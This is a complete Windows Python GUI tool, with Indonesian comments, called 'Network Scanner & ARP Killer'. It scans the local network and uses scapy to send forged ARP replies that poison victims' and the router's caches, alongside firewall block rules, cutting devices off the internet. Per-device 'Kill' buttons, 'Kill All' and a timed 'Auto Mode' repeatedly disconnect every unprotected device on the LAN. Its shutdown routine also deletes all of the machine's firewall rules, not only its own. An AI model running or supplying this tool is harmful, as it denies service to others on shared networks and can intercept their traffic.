#!/usr/bin/env python3
# Windows version
# Run as Administrator: python 3.py
import sys
import subprocess
import re
import threading
import time
import platform
from typing import List, Dict, Optional
from dataclasses import dataclass

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QHBoxLayout, 
    QWidget, QPushButton, QTableWidget, QTableWidgetItem,
    QLabel, QLineEdit, QTextEdit, QGroupBox, QCheckBox,
    QMessageBox, QProgressBar, QSplitter, QHeaderView, QSpinBox
)
from PyQt6.QtCore import QThread, pyqtSignal, QTimer, Qt
from PyQt6.QtGui import QFont, QColor

try:
    from scapy.all import *
except ImportError:
    print("Error: Scapy tidak terinstall. Install dengan: pip install scapy")
    sys.exit(1)

@dataclass
class Device:
    ip: str
    mac: str
    admin: bool = False
    
    def __eq__(self, other):
        return isinstance(other, Device) and self.mac == other.mac

class NetworkInterface:
    def __init__(self, name: str):
        self.name = name

def get_default_iface():
    """Mendapatkan interface default untuk Windows."""
    try:
        # Gunakan scapy untuk mendapatkan default interface
        iface = conf.iface
        return NetworkInterface(iface.name if hasattr(iface, 'name') else str(iface))
    except Exception as e:
        print(f"Error getting default interface: {e}")
        return NetworkInterface('Ethernet')

def get_my_ip():
    """Mendapatkan IP address komputer ini (Windows)."""
    try:
        # Method 1: menggunakan scapy
        try:
            iface = get_default_iface()
            if hasattr(conf.iface, 'ip'):
                return conf.iface.ip
        except:
            pass
        
        # Method 2: menggunakan ipconfig
        result = subprocess.run(['ipconfig'], capture_output=True, text=True, encoding='cp437')
        lines = result.stdout.splitlines()
        
        for i, line in enumerate(lines):
            if 'Default Gateway' in line and i > 0:
                # Cari IPv4 Address di atas gateway
                for j in range(i-1, max(i-10, 0), -1):
                    if 'IPv4 Address' in lines[j]:
                        parts = lines[j].split(':')
                        if len(parts) > 1:
                            ip = parts[1].strip()
                            # Hapus (Preferred) jika ada
                            ip = ip.replace('(Preferred)', '').strip()
                            if ip and ip.count('.') == 3:
                                return ip
    except Exception as e:
        print(f"Error getting my IP: {e}")
    return None

def get_my_mac():
    """Mendapatkan MAC address komputer ini (Windows)."""
    try:
        # Method 1: menggunakan scapy
        try:
            if hasattr(conf.iface, 'mac'):
                return conf.iface.mac
        except:
            pass
        
        # Method 2: menggunakan getmac
        result = subprocess.run(['getmac', '/FO', 'CSV', '/NH'], 
                              capture_output=True, text=True, encoding='cp437')
        lines = result.stdout.strip().split('\n')
        if lines:
            # Format: "MAC-Address","Transport Name"
            mac = lines[0].split(',')[0].strip('"').replace('-', ':').lower()
            return mac
    except Exception as e:
        print(f"Error getting my MAC: {e}")
    return None

def enable_ip_forwarding():
    """Aktifkan IP forwarding (Windows)."""
    try:
        # Windows menggunakan registry untuk IP forwarding
        # Atau bisa menggunakan netsh
        subprocess.run([
            'netsh', 'interface', 'ipv4', 'set', 'interface', 
            get_default_iface().name, 'forwarding=enabled'
        ], check=True, capture_output=True)
        print("[SYSTEM] IP forwarding enabled")
        return True
    except subprocess.CalledProcessError as e:
        # Jika gagal, coba method alternatif (tidak kritis untuk Windows)
        print(f"[WARNING] Could not enable IP forwarding: {e}")
        return True  # Return True karena tidak kritis di Windows

def disable_ip_forwarding():
    """Nonaktifkan IP forwarding (Windows)."""
    try:
        subprocess.run([
            'netsh', 'interface', 'ipv4', 'set', 'interface', 
            get_default_iface().name, 'forwarding=disabled'
        ], check=True, capture_output=True)
        print("[SYSTEM] IP forwarding disabled")
    except subprocess.CalledProcessError as e:
        print(f"[WARNING] Could not disable IP forwarding: {e}")

def threaded(func):
    """Decorator untuk menjalankan fungsi di thread terpisah."""
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=func, args=args, kwargs=kwargs)
        thread.daemon = True
        thread.start()
        return thread
    return wrapper

class Killer:
    def __init__(self, router=None, protected_macs=None):
        self.iface = get_default_iface()
        self.router = router
        self.killed = {}
        self.storage = {}
        self.running = True
        self.my_ip = get_my_ip()
        self.my_mac = get_my_mac()
        self.protected_macs = protected_macs or []
        
        # Enable IP forwarding (opsional di Windows)
        enable_ip_forwarding()
        print(f"[INFO] My IP: {self.my_ip}, My MAC: {self.my_mac}")

    def add_windows_firewall_block(self, ip):
        """Blokir traffic menggunakan Windows Firewall."""
        try:
            rule_name = f"NetKiller_Block_{ip.replace('.', '_')}"
            
            # Blokir outbound
            subprocess.run([
                'netsh', 'advfirewall', 'firewall', 'add', 'rule',
                f'name={rule_name}_OUT',
                'dir=out',
                'action=block',
                f'remoteip={ip}'
            ], check=True, capture_output=True)
            
            # Blokir inbound
            subprocess.run([
                'netsh', 'advfirewall', 'firewall', 'add', 'rule',
                f'name={rule_name}_IN',
                'dir=in',
                'action=block',
                f'remoteip={ip}'
            ], check=True, capture_output=True)
            
            print(f"[FIREWALL] Added block rules for {ip}")
        except subprocess.CalledProcessError as e:
            print(f"[FIREWALL ERROR] Failed to add rule for {ip}: {e}")

    def remove_windows_firewall_block(self, ip):
        """Hapus blokir traffic dari Windows Firewall."""
        try:
            rule_name = f"NetKiller_Block_{ip.replace('.', '_')}"
            
            subprocess.run([
                'netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                f'name={rule_name}_OUT'
            ], check=True, capture_output=True, stderr=subprocess.DEVNULL)
            
            subprocess.run([
                'netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                f'name={rule_name}_IN'
            ], check=True, capture_output=True, stderr=subprocess.DEVNULL)
            
            print(f"[FIREWALL] Removed block rules for {ip}")
        except subprocess.CalledProcessError:
            pass

    @threaded
    def kill(self, victim, wait_after=0.5):
        """Spoofing victim."""
        if not self.router:
            print("Router tidak ditemukan!")
            return
        if victim.mac.lower() in [mac.lower() for mac in self.protected_macs]:
            print(f"[PROTECTED] Skipping protected MAC: {victim.mac}")
            return
        
        if victim.ip == self.my_ip or victim.mac == self.my_mac:
            print(f"[WARNING] Skipping self: {victim.ip}")
            return
            
        if victim.mac in self.killed:
            print(f"{victim.mac} sudah di-kill.")
            return
        
        self.killed[victim.mac] = victim
        self.add_windows_firewall_block(victim.ip)

        to_victim = ARP(
            op=2,
            psrc=self.router.ip,
            hwsrc=self.my_mac,
            pdst=victim.ip,
            hwdst=victim.mac
        )

        to_router = ARP(
            op=2,
            psrc=victim.ip,
            hwsrc=self.my_mac,
            pdst=self.router.ip,
            hwdst=self.router.mac
        )

        print(f'[KILL] Started poisoning {victim.ip} ({victim.mac})')

        while (victim.mac in self.killed and 
               self.iface.name != 'NULL' and 
               self.running):
            try:
                send(to_victim, iface=self.iface.name, verbose=0)
                send(to_router, iface=self.iface.name, verbose=0)
                time.sleep(wait_after)
            except Exception as e:
                print(f"[ERROR] Error sending packets: {e}")
                break

        print(f'[UNKILL] Stopped poisoning {victim.mac}')

    @threaded
    def unkill(self, victim):
        """Unspoofing victim."""
        if victim.mac not in self.killed:
            return
            
        self.killed.pop(victim.mac, None)
        self.remove_windows_firewall_block(victim.ip)

        if not self.router:
            return

        to_victim = ARP(
            op=2,
            psrc=self.router.ip,
            hwsrc=self.router.mac,
            pdst=victim.ip,
            hwdst=victim.mac
        )

        to_router = ARP(
            op=2,
            psrc=victim.ip,
            hwsrc=victim.mac,
            pdst=self.router.ip,
            hwdst=self.router.mac
        )

        if self.iface.name != 'NULL':
            try:
                for _ in range(5):
                    send(to_victim, iface=self.iface.name, verbose=0)
                    send(to_router, iface=self.iface.name, verbose=0)
                    time.sleep(0.2)
                print(f'[FIX] Restored ARP for {victim.ip} ({victim.mac})')
            except Exception as e:
                print(f"[ERROR] Error fixing victim: {e}")

    def kill_all(self, device_list):
        """Kill semua device yang tidak admin."""
        for device in device_list[:]:
            if device.admin:
                continue
            if device.ip == self.my_ip or device.mac == self.my_mac:
                continue
            if device.mac not in self.killed:
                self.kill(device)

    def unkill_all(self):
        """Unkill semua device."""
        for mac in list(self.killed.keys()):
            device = self.killed[mac]
            self.unkill(device)

    def stop(self):
        """Stop killer."""
        self.running = False
        self.unkill_all()
        time.sleep(2)
        disable_ip_forwarding()
        
        # Clean up all firewall rules
        try:
            subprocess.run([
                'netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                'name=all', 'dir=in'
            ], capture_output=True)
            subprocess.run([
                'netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                'name=all', 'dir=out'
            ], capture_output=True)
            print("[CLEANUP] Cleared firewall rules")
        except:
            pass

class NetworkScanner(QThread):
    devices_found = pyqtSignal(list)
    progress_update = pyqtSignal(str)
    
    def __init__(self):
        super().__init__()
        self.network = None
        self.gateway = None
        self.gateway_mac = None
        self.my_ip = get_my_ip()
        self.my_mac = get_my_mac()
    
    def get_network_info(self):
        """Mendapatkan informasi jaringan (Windows)."""
        try:
            result = subprocess.run(['ipconfig'], capture_output=True, text=True, encoding='cp437')
            lines = result.stdout.splitlines()
            
            current_ip = None
            subnet_mask = None
            
            for line in lines:
                if 'IPv4 Address' in line:
                    parts = line.split(':')
                    if len(parts) > 1:
                        current_ip = parts[1].strip().replace('(Preferred)', '').strip()
                elif 'Subnet Mask' in line:
                    parts = line.split(':')
                    if len(parts) > 1:
                        subnet_mask = parts[1].strip()
                elif 'Default Gateway' in line and current_ip and subnet_mask:
                    parts = line.split(':')
                    if len(parts) > 1:
                        gateway = parts[1].strip()
                        if gateway and gateway != '':
                            self.gateway = gateway
                            # Konversi IP dan subnet mask ke network range
                            self.network = self.calculate_network(current_ip, subnet_mask)
                            return True
        except Exception as e:
            self.progress_update.emit(f"Error getting network info: {e}")
        return False
    
    def calculate_network(self, ip, netmask):
        """Menghitung network range dari IP dan netmask."""
        ip_parts = [int(x) for x in ip.split('.')]
        mask_parts = [int(x) for x in netmask.split('.')]
        
        network_parts = [ip_parts[i] & mask_parts[i] for i in range(4)]
        
        # Hitung CIDR
        cidr = sum([bin(x).count('1') for x in mask_parts])
        
        return f"{'.'.join(map(str, network_parts))}/{cidr}"
    
    def get_gateway_mac(self):
        """Mendapatkan MAC address gateway."""
        if not self.gateway:
            return None
        try:
            arp = ARP(pdst=self.gateway)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            result = srp(packet, timeout=10, verbose=0)[0]
            if result:
                return result[0][1].hwsrc
        except Exception:
            pass
        return None
    
    def run(self):
        """Menjalankan scan jaringan."""
        self.progress_update.emit("Mendapatkan informasi jaringan...")
        
        if not self.get_network_info():
            self.progress_update.emit("Gagal mendapatkan informasi jaringan")
            return
        
        self.progress_update.emit(f"Scanning jaringan: {self.network}")
        
        try:
            arp = ARP(pdst=self.network)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            
            result = srp(packet, timeout=10, verbose=0)[0]
            
            devices = []
            for sent, received in result:
                is_gateway = (received.psrc == self.gateway)
                is_self = (received.psrc == self.my_ip or received.hwsrc == self.my_mac)
                
                device = Device(
                    ip=received.psrc,
                    mac=received.hwsrc,
                    admin=(is_gateway or is_self)
                )
                devices.append(device)
            
            self.gateway_mac = self.get_gateway_mac()
            
            self.devices_found.emit(devices)
            self.progress_update.emit(f"Ditemukan {len(devices)} device")
            
        except Exception as e:
            self.progress_update.emit(f"Error scanning: {e}")

class NetworkKillerGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.devices = []
        self.killer = None
        self.scanner = NetworkScanner()
        self.gateway_device = None
        
        self.protected_macs = ["16:23:9c:5c:1f:f1"]
        
        self.auto_mode_enabled = False
        self.auto_timer = QTimer()
        self.auto_timer.timeout.connect(self.auto_scan_and_kill)
        self.countdown_timer = QTimer()
        self.countdown_timer.timeout.connect(self.update_countdown)
        self.countdown_seconds = 0
        
        self.init_ui()
        self.setup_connections()

    def init_ui(self):
        self.setWindowTitle("Network Scanner & ARP Killer - Auto Mode")
        self.setGeometry(100, 100, 1000, 750)
        
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Main layout
        layout = QVBoxLayout(central_widget)
        
        # Control panel
        control_group = QGroupBox("Control Panel")
        control_layout = QVBoxLayout(control_group)
        
        # Manual control buttons (baris pertama)
        manual_layout = QHBoxLayout()
        
        self.scan_btn = QPushButton("Scan Network")
        self.scan_btn.setMinimumHeight(50)
        self.scan_btn.setMinimumWidth(150)
        
        self.kill_all_btn = QPushButton("Kill All")
        self.kill_all_btn.setMinimumHeight(50)
        self.kill_all_btn.setMinimumWidth(120)
        self.kill_all_btn.setEnabled(False)
        
        self.unkill_all_btn = QPushButton("Unkill All")
        self.unkill_all_btn.setMinimumHeight(50)
        self.unkill_all_btn.setMinimumWidth(120)
        self.unkill_all_btn.setEnabled(False)
        
        manual_layout.addWidget(self.scan_btn)
        manual_layout.addWidget(self.kill_all_btn)
        manual_layout.addWidget(self.unkill_all_btn)
        manual_layout.addStretch()
        
        # Auto mode controls (baris kedua)
        auto_layout = QHBoxLayout()
        
        auto_label = QLabel("Auto Mode Interval:")
        auto_label.setStyleSheet("font-weight: bold; font-size: 13px;")
        
        self.interval_spinbox = QSpinBox()
        self.interval_spinbox.setMinimum(1)
        self.interval_spinbox.setMaximum(60)
        self.interval_spinbox.setValue(2)
        self.interval_spinbox.setSuffix(" menit")
        self.interval_spinbox.setMinimumHeight(40)
        self.interval_spinbox.setMinimumWidth(120)
        self.interval_spinbox.setStyleSheet("font-size: 13px; padding: 5px;")
        
        self.auto_mode_btn = QPushButton("Start Auto Mode")
        self.auto_mode_btn.setMinimumHeight(50)
        self.auto_mode_btn.setMinimumWidth(180)
        self.auto_mode_btn.setCheckable(True)
        
        self.countdown_label = QLabel("Auto mode: Inactive")
        self.countdown_label.setStyleSheet("""
            font-size: 13px; 
            font-weight: bold; 
            padding: 10px; 
            background-color: #ecf0f1; 
            border-radius: 5px;
        """)
        
        auto_layout.addWidget(auto_label)
        auto_layout.addWidget(self.interval_spinbox)
        auto_layout.addWidget(self.auto_mode_btn)
        auto_layout.addWidget(self.countdown_label)
        auto_layout.addStretch()
        
        control_layout.addLayout(manual_layout)
        control_layout.addLayout(auto_layout)
        
        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        
        # Status label
        self.status_label = QLabel("Ready to scan network")
        
        # Splitter for tables and logs
        splitter = QSplitter(Qt.Orientation.Vertical)
        
        # Device table
        device_group = QGroupBox("Network Devices")
        device_layout = QVBoxLayout(device_group)
        
        self.device_table = QTableWidget()
        self.device_table.setColumnCount(4)
        self.device_table.setHorizontalHeaderLabels(["IP Address", "MAC Address", "Status", "Action"])
        
        # Set column widths
        header = self.device_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        
        # Set row height lebih besar untuk tampung tombol yang lebih besar
        self.device_table.verticalHeader().setDefaultSectionSize(45)
        
        device_layout.addWidget(self.device_table)
        
        # Log area
        log_group = QGroupBox("Log")
        log_layout = QVBoxLayout(log_group)
        
        self.log_text = QTextEdit()
        self.log_text.setMaximumHeight(150)
        self.log_text.setReadOnly(True)
        log_layout.addWidget(self.log_text)
        
        # Add to splitter
        splitter.addWidget(device_group)
        splitter.addWidget(log_group)
        splitter.setSizes([400, 150])
        
        # Add to main layout
        layout.addWidget(control_group)
        layout.addWidget(self.progress_bar)
        layout.addWidget(self.status_label)
        layout.addWidget(splitter)
        
        # Style dengan warna custom
        self.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #cccccc;
                border-radius: 5px;
                margin-top: 1ex;
                padding-top: 10px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
            QPushButton {
                padding: 10px;
                border-radius: 6px;
                border: none;
                font-size: 14px;
                font-weight: bold;
            }
            QPushButton:hover {
                opacity: 0.9;
            }
            QPushButton:pressed {
                padding-top: 12px;
                padding-bottom: 8px;
            }
            QPushButton:disabled {
                opacity: 0.5;
            }
        """)
        
        # Style individual untuk setiap tombol
        self.scan_btn.setStyleSheet("""
            QPushButton {
                background-color: #9b59b6;
                color: white;
                padding: 10px;
                border-radius: 6px;
                border: none;
                font-size: 14px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #8e44ad;
            }
            QPushButton:pressed {
                background-color: #7d3c98;
                padding-top: 12px;
                padding-bottom: 8px;
            }
        """)
        
        self.kill_all_btn.setStyleSheet("""
            QPushButton {
                background-color: #e74c3c;
                color: white;
                padding: 10px;
                border-radius: 6px;
                border: none;
                font-size: 14px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #c0392b;
            }
            QPushButton:pressed {
                background-color: #a93226;
                padding-top: 12px;
                padding-bottom: 8px;
            }
            QPushButton:disabled {
                background-color: #e74c3c;
                opacity: 0.5;
            }
        """)
        
        self.unkill_all_btn.setStyleSheet("""
            QPushButton {
                background-color: #27ae60;
                color: white;
                padding: 10px;
                border-radius: 6px;
                border: none;
                font-size: 14px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #229954;
            }
            QPushButton:pressed {
                background-color: #1e8449;
                padding-top: 12px;
                padding-bottom: 8px;
            }
            QPushButton:disabled {
                background-color: #27ae60;
                opacity: 0.5;
            }
        """)
        
        self.auto_mode_btn.setStyleSheet("""
            QPushButton {
                background-color: #3498db;
                color: white;
                padding: 10px;
                border-radius: 6px;
                border: none;
                font-size: 14px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #2980b9;
            }
            QPushButton:pressed {
                background-color: #21618c;
                padding-top: 12px;
                padding-bottom: 8px;
            }
            QPushButton:checked {
                background-color: #e67e22;
            }
            QPushButton:checked:hover {
                background-color: #d35400;
            }
        """)
    
    def setup_connections(self):
        self.scan_btn.clicked.connect(self.start_scan)
        self.kill_all_btn.clicked.connect(self.kill_all_devices)
        self.unkill_all_btn.clicked.connect(self.unkill_all_devices)
        self.auto_mode_btn.clicked.connect(self.toggle_auto_mode)
        
        self.scanner.devices_found.connect(self.update_device_table)
        self.scanner.progress_update.connect(self.update_status)
        self.scanner.finished.connect(self.scan_finished)
    
    def toggle_auto_mode(self):
        """Toggle auto mode on/off"""
        if self.auto_mode_btn.isChecked():
            # Start auto mode
            self.auto_mode_enabled = True
            interval_minutes = self.interval_spinbox.value()
            interval_ms = interval_minutes * 60 * 1000
            
            self.auto_mode_btn.setText("Stop Auto Mode")
            self.interval_spinbox.setEnabled(False)
            self.scan_btn.setEnabled(False)
            
            # Start countdown
            self.countdown_seconds = interval_minutes * 60
            self.countdown_timer.start(1000)  # Update setiap detik
            
            # Start auto timer
            self.auto_timer.start(interval_ms)
            
            self.log_message(f"Auto mode STARTED - Interval: {interval_minutes} menit")
            
            # Langsung scan pertama kali
            self.auto_scan_and_kill()
        else:
            # Stop auto mode
            self.auto_mode_enabled = False
            self.auto_timer.stop()
            self.countdown_timer.stop()
            
            self.auto_mode_btn.setText("Start Auto Mode")
            self.interval_spinbox.setEnabled(True)
            self.scan_btn.setEnabled(True)
            
            self.countdown_label.setText("Auto mode: Inactive")
            self.countdown_label.setStyleSheet("""
                font-size: 13px; 
                font-weight: bold; 
                padding: 10px; 
                background-color: #ecf0f1; 
                border-radius: 5px;
            """)
            
            self.log_message("Auto mode STOPPED")
    
    def update_countdown(self):
        """Update countdown display"""
        self.countdown_seconds -= 1
        
        if self.countdown_seconds <= 0:
            interval_minutes = self.interval_spinbox.value()
            self.countdown_seconds = interval_minutes * 60
        
        minutes = self.countdown_seconds // 60
        seconds = self.countdown_seconds % 60
        
        self.countdown_label.setText(f"Next scan in: {minutes:02d}:{seconds:02d}")
        
        # Change color when close to scan time
        if self.countdown_seconds <= 10:
            self.countdown_label.setStyleSheet("""
                font-size: 13px; 
                font-weight: bold; 
                padding: 10px; 
                background-color: #e74c3c; 
                color: white;
                border-radius: 5px;
            """)
        elif self.countdown_seconds <= 30:
            self.countdown_label.setStyleSheet("""
                font-size: 13px; 
                font-weight: bold; 
                padding: 10px; 
                background-color: #f39c12; 
                color: white;
                border-radius: 5px;
            """)
        else:
            self.countdown_label.setStyleSheet("""
                font-size: 13px; 
                font-weight: bold; 
                padding: 10px; 
                background-color: #27ae60; 
                color: white;
                border-radius: 5px;
            """)
    
    def auto_scan_and_kill(self):
        """Automatically scan and kill all non-admin devices"""
        if not self.auto_mode_enabled:
            return
        
        self.log_message("=" * 50)
        self.log_message("AUTO MODE: Starting scan and kill cycle...")
        self.start_scan(auto_kill=True)
    
    def log_message(self, message):
        """Menambahkan pesan ke log"""
        self.log_text.append(f"[{time.strftime('%H:%M:%S')}] {message}")
    
    def update_status(self, message):
        """Update status label"""
        self.status_label.setText(message)
        self.log_message(message)
    
    def start_scan(self, auto_kill=False):
        """Memulai scan jaringan"""
        self.scan_btn.setEnabled(False)
        self.progress_bar.setVisible(True)
        self.progress_bar.setRange(0, 0)
        self.device_table.setRowCount(0)
        self.devices.clear()
        
        # Store flag untuk auto kill setelah scan
        self.pending_auto_kill = auto_kill
        
        self.scanner.start()
    
    def scan_finished(self):
        """Scan selesai"""
        if not self.auto_mode_enabled:
            self.scan_btn.setEnabled(True)
        self.progress_bar.setVisible(False)
        
        if self.devices:
            self.kill_all_btn.setEnabled(True)
            self.unkill_all_btn.setEnabled(True)
            
            if self.gateway_device:
                if not self.killer or self.killer.router != self.gateway_device:
                    self.killer = Killer(self.gateway_device, protected_macs=self.protected_macs)
                    self.log_message(f"Killer initialized with gateway: {self.gateway_device.ip}")
                    self.log_message(f"Protected MACs: {', '.join(self.protected_macs)}")
                
                # Auto kill jika diperlukan
                if hasattr(self, 'pending_auto_kill') and self.pending_auto_kill:
                    self.pending_auto_kill = False
                    non_admin_devices = [d for d in self.devices if not d.admin]
                    
                    if non_admin_devices:
                        self.log_message(f"AUTO MODE: Killing {len(non_admin_devices)} devices...")
                        self.killer.kill_all(non_admin_devices)
                        
                        for device in non_admin_devices:
                            self.update_device_status(device, "KILLED")
                    else:
                        self.log_message("AUTO MODE: No devices to kill")
    
    def update_device_table(self, devices):
        """Update tabel device"""
        self.devices = devices
        self.device_table.setRowCount(len(devices))
        
        my_ip = get_my_ip()
        my_mac = get_my_mac()
        
        for i, device in enumerate(devices):
            ip_item = QTableWidgetItem(device.ip)
            self.device_table.setItem(i, 0, ip_item)
            
            mac_item = QTableWidgetItem(device.mac)
            self.device_table.setItem(i, 1, mac_item)
            
            # Status
            if device.ip == my_ip or device.mac == my_mac:
                status_item = QTableWidgetItem("This Computer")
                status_item.setBackground(QColor(0, 255, 0, 100))  # Green
            elif device.mac.lower() in [mac.lower() for mac in self.protected_macs]:
                # MAC yang diproteksi
                status_item = QTableWidgetItem("Protected Device")
                status_item.setBackground(QColor(0, 191, 255, 100))  # Light Blue
                device.admin = True
            elif device.admin:
                status_item = QTableWidgetItem("Gateway/Router")
                status_item.setBackground(QColor(255, 255, 0, 100))  # Yellow
                self.gateway_device = device
            else:
                status_item = QTableWidgetItem("Device")
            
            self.device_table.setItem(i, 2, status_item)
            
            # Action buttons - LEBIH BESAR
            if not device.admin:
                action_widget = QWidget()
                action_layout = QHBoxLayout(action_widget)
                action_layout.setContentsMargins(5, 2, 5, 2)
                
                kill_btn = QPushButton("Kill")
                kill_btn.setMinimumHeight(35)
                kill_btn.setMinimumWidth(80)
                kill_btn.setStyleSheet("""
                    QPushButton {
                        background-color: #e74c3c;
                        color: white;
                        padding: 5px;
                        border-radius: 4px;
                        border: none;
                        font-weight: bold;
                    }
                    QPushButton:hover {
                        background-color: #c0392b;
                    }
                    QPushButton:pressed {
                        background-color: #a93226;
                    }
                """)
                kill_btn.clicked.connect(lambda checked, d=device: self.kill_device(d))
                
                unkill_btn = QPushButton("Unkill")
                unkill_btn.setMinimumHeight(35)
                unkill_btn.setMinimumWidth(80)
                unkill_btn.setStyleSheet("""
                    QPushButton {
                        background-color: #27ae60;
                        color: white;
                        padding: 5px;
                        border-radius: 4px;
                        border: none;
                        font-weight: bold;
                    }
                    QPushButton:hover {
                        background-color: #229954;
                    }
                    QPushButton:pressed {
                        background-color: #1e8449;
                    }
                """)
                unkill_btn.clicked.connect(lambda checked, d=device: self.unkill_device(d))
                
                action_layout.addWidget(kill_btn)
                action_layout.addWidget(unkill_btn)
                action_layout.addStretch()
                
                self.device_table.setCellWidget(i, 3, action_widget)
            else:
                protected_item = QTableWidgetItem("Protected")
                self.device_table.setItem(i, 3, protected_item)

    
    def kill_device(self, device):
        """Kill satu device"""
        if device.mac.lower() in [mac.lower() for mac in self.protected_macs]:
            QMessageBox.warning(
                self, "Protected Device", 
                f"Device {device.ip} ({device.mac}) dilindungi dan tidak dapat di-kill."
            )
            return
        if self.killer:
            self.killer.kill(device)
            self.log_message(f"Killing device: {device.ip} ({device.mac})")
            self.update_device_status(device, "KILLED")
    
    def unkill_device(self, device):
        """Unkill satu device"""
        if self.killer:
            self.killer.unkill(device)
            self.log_message(f"Unkilling device: {device.ip} ({device.mac})")
            self.update_device_status(device, "Active")
    
    def kill_all_devices(self):
        """Kill semua device non-admin"""
        if not self.killer:
            QMessageBox.warning(self, "Warning", "Killer tidak diinisialisasi. Scan network terlebih dahulu.")
            return
        
        reply = QMessageBox.question(
            self, 'Konfirmasi', 
            'Yakin ingin kill semua device?\nIni akan memutus koneksi internet mereka.',
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            QMessageBox.StandardButton.No
        )
        
        if reply == QMessageBox.StandardButton.Yes:
            non_admin_devices = [d for d in self.devices if not d.admin]
            self.killer.kill_all(non_admin_devices)
            self.log_message(f"Killing {len(non_admin_devices)} devices...")
            
            for device in non_admin_devices:
                self.update_device_status(device, "KILLED")
    
    def unkill_all_devices(self):
        """Unkill semua device"""
        if not self.killer:
            return
        
        self.killer.unkill_all()
        self.log_message("Unkilling all devices...")
        
        for device in self.devices:
            if not device.admin:
                self.update_device_status(device, "Active")
    
    def update_device_status(self, target_device, status):
        """Update status device di tabel"""
        for i in range(self.device_table.rowCount()):
            ip_item = self.device_table.item(i, 0)
            if ip_item and ip_item.text() == target_device.ip:
                status_item = self.device_table.item(i, 2)
                if status_item and not target_device.admin:
                    status_item.setText(status)
                    if status == "KILLED":
                        status_item.setBackground(QColor(255, 0, 0, 100))
                    else:
                        status_item.setBackground(QColor(0, 0, 0, 0))
                break
    
    def closeEvent(self, event):
        """Handle aplikasi ditutup"""
        # Stop auto mode jika aktif
        if self.auto_mode_enabled:
            self.auto_timer.stop()
            self.countdown_timer.stop()
        
        if self.killer:
            self.log_message("Stopping killer and restoring connections...")
            self.killer.stop()
            time.sleep(2)
        
        event.accept()

def is_admin():
    """Check if running as Administrator on Windows."""
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def main():
    app = QApplication(sys.argv)
    
    # Check if running as Administrator (Windows)
    if platform.system() == 'Windows':
        if not is_admin():
            QMessageBox.critical(
                None, "Error", 
                "Aplikasi ini memerlukan hak akses Administrator.\n"
                "Klik kanan pada file dan pilih 'Run as Administrator'"
            )
            sys.exit(1)
    
    window = NetworkKillerGUI()
    window.show()
    
    sys.exit(app.exec())

if __name__ == "__main__":
    import os
    main()
